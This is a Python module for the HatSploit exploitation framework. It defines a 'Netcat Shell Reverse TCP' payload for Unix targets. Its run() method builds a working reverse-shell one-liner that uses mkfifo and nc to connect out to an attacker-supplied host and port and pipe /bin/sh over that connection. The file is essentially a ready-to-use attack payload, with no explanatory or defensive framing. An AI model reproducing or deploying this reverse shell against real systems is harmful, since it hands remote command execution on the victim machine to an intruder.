"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from pex.string import String


class HatSploitPayload(Payload, ReverseTCPHandler, String):
    def __init__(self):
        super().__init__({
            'Name': "Netcat Shell Reverse TCP",
            'Payload': "unix/generic/netcat_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Netcat shell reverse TCP payload.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_UNIX,
        })

    def run(self):
        filename = self.random_string(8)
        payload = f"mkfifo /tmp/{filename}; nc {self.rhost.value} {self.rport.value} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"

        return payload
